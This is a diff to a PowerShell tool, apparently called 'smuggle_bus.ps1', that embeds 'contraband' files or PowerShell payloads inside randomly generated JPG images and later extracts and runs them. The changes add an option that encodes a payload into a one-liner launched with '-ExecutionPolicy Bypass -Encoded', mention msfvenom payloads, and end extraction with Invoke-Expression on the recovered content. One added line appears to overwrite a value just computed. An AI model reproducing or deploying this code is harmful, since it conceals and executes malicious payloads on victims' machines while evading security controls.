@@ -38,10 +38,6 @@ Here is a detailed summary of parameters:
 	 * .\smuggle_bus.ps1 -mode off -busPath "C:\Other\Path\" -label 123 : Will search C:\Other\Path\ for any files labeled with 123 and attempt to extract the embedded file into the current directory
 	 * .\smuggle_bus.ps1 -mode off -busPath "C:\Other\Path\" -outPath "C:\Still\another\Path\" -label 123 : Will search C:\Other\Path\ for any files labeled with 123 and	attempt to extract the embedded file into C:\Still\another\Path\
 	 
-Basic Smuggle Bus Useage is as follows:
-
-	 .\smuggle_bus.ps1 -mode [on/off] -contraband [path to file/file(s) to smuggle] -busPath [path for smuggle buses; default is CWD] -outPath [path for extracted files; default is CWD] -archive [set to $true to enable archive mode] -archivePassword [password for encrypted archive; default is random password] -maskFile [specific mask file you want to use; default is random jpg] -label [smuggle bus file label] 
-	 
 Manipulate Zip file in memory: https://stackoverflow.com/questions/25143435/is-there-a-way-of-manipulating-zip-file-contents-in-memory-with-powershell
 
 ##>
@@ -54,9 +50,10 @@ Param (
 	[string]$mode, # mask on / mask off mode switch
 	[string]$contraband, # file(s) we're hiding
 	[int32[]]$label, # the label(s) hidden inside smuggle buses that we use to recognize and extract them
-	[string]$busPath=".\", # path in which to look for files
-	[string]$outPath=".\", # path to output extracted files in off mode
-	[string]$maskFile # option to specify a particular mask file
+	[string]$busPath=(pwd).Path, # path in which to look for files
+	[string]$outPath=(pwd).Path, # path to output extracted files in off mode
+	[string]$maskFile, # option to specify a particular mask file
+	[bool]$encodePayload # option to have multiline powershell payload encoded into a oneliner; not necessary for msfvenom powershell payloads
 )
 
 $archive = "a"
@@ -93,8 +90,25 @@ if (($mode -eq "on") -and ($archive)) {
 		
 		$archiveFile = "$busPath\$random"
 		$stageFile = "$busPath\$random2"
-		$powershellScriptEncodedBytes = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content $contraband)))
-		Set-Content -Path "$stageFile" -Value $powershellScriptEncodedBytes
+		
+		if ($encodePayload) {
+		
+		$s = Get-Content $contraband | Out-String
+		$j = [PSCustomObject]@{
+		"Script" =  [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($s))
+		} | ConvertTo-Json -Compress
+
+		$oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('" + $j + "' | ConvertFrom-Json).Script)) | iex"
+
+		$c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))
+
+		("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded " + $c) | Out-File -Encoding Default $stageFile}
+		
+		else {
+			$s = Get-Content $contraband
+			Set-Content -Path $stageFile -Value $s
+		}
+
 		Start-Sleep -Seconds 3
 		Compress-Archive -Path "$stageFile" -DestinationPath "$archiveFile`.zip"
 		Rename-Item -Path "$archiveFile`.zip" -NewName "$archiveFile"
@@ -131,12 +145,55 @@ if ($mode -eq "on") {
 		ForEach ($f in $contrabandFiles) {
 			
 			if (!$maskFile) {
-				$mask = invoke-webrequest -Uri "https://picsum.photos/500"
-				$mask = $mask.content
-				$newName = Get-Random
-				$newName = "$newName`.jpg"
-				$newName = "$busPath\$newName"
-				$mask | set-content -encoding byte -Path $newName
+				$colorArray = "Red","Orange","Yellow","Green","Blue","Indigo","Violet"
+				$color = $colorArray[(1..($colorArray.Length - 1) | Get-Random)]
+				$color2 = $colorArray[(1..($colorArray.Length - 1) | Get-Random)]
+
+				$size = 900..1600 | Get-Random
+				$size2 = 900..1600 | Get-Random
+
+				$filename = Get-Random
+				$filename = "$filename`.png"
+				$filename = "$busPath\$filename"
+
+				$filename2 = Get-Random
+				$filename2 = "$filename2`.jpg"
+				$filename2 = "$busPath\$filename2"
+
+				$string = ""
+
+				$i = 1
+				while ($i -lt 50) {
+					$string += -join ((65..90) + (97..122) | Get-Random -Count 1 | % {[char]$_})
+					$i++
+				}
+
+				Add-Type -AssemblyName System.Drawing
+
+				$bmp = new-object System.Drawing.Bitmap $size,$size2 
+				$font = new-object System.Drawing.Font Consolas,24
+				$brushBg = [System.Drawing.Brushes]::$color 
+				$brushFg = [System.Drawing.Brushes]::$color2 
+				$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
+				$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
+				$graphics.DrawString($string,$font,$brushFg,10,10) 
+				$graphics.Dispose() 
+				$bmp.Save($filename) 
+
+				$image = ([System.Drawing.Image]::FromFile($filename))
+
+				$Bitmap = [Drawing.Bitmap]::new($image.Width, $image.Height)
+				$g = [System.Drawing.Graphics]::FromImage($Bitmap)
+				$g.Clear([drawing.color]::White)
+				$g.DrawImageUnscaled($Image, 0, 0);
+
+				$Bitmap.Save($filename2, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+				
+				$image.Dispose()
+				Remove-Item $filename
+
+				$newName = $filename2
+				$mask = Get-Content -encoding byte $newName
 			} else {
 				$mask = Get-Content -encoding byte $maskFile
 				$newName = (Get-ChildItem $maskFile).Name
@@ -190,6 +247,7 @@ if ($mode -eq "on") {
 			$insert = "$random!$random2"
 			$insertEncoded = $insert
 			$insertArray = $insertEncoded -split '(?<=\D)(?=\d)'
+			$insertArray = $insertEncoded
 			1..24|%{[byte](Get-Random -Minimum ([byte]::MinValue) -Maximum ([byte]::MaxValue))} | add-content -Path $newName -encoding byte -NoNewLine
 			$key | add-content -NoNewLine -Path $newName
 			1..4|%{[byte](Get-Random -Minimum 0 -Maximum 30)} | add-content -Path $newName -encoding byte -NoNewLine
@@ -349,16 +407,17 @@ function Extract-FileFromInMemoryZip
 				#$extractDecoded = [System.Text.Encoding]::Unicode.Getstring([System.Convert]::FromBase64String($extractTrim))
 				$stageFile = $extractTrim.Split("!") | select -index 1
 				$stageFile = $stageFile.Trim()
+				$stageFile = $stageFile -replace " ",""
 				
 				$fileLength = $contrabandLength
 			
 				$archiveBytes = [byte[]]($combinedBytes | select -last ($fileLength + 16000) | select -first $fileLength)
 				$powershellScriptEncodedBytes = Extract-FileFromInMemoryZip $archiveBytes -FileInsideZipIWant "$stageFile" -utf8
 				$powershellScriptEncodedBytes = $powershellScriptEncodedBytes | select -skip 1
-				$powershellDecoded = [System.Text.Encoding]::Unicode.Getstring([System.Convert]::FromBase64String($powershellScriptEncodedBytes))
-
-				Invoke-Expression $powershellDecoded
-			
+				
+				$powershellDecoded = $powershellScriptEncodedBytes
+				
+				Invoke-Expression -command $powershellDecoded
 			}
 		}
 	}
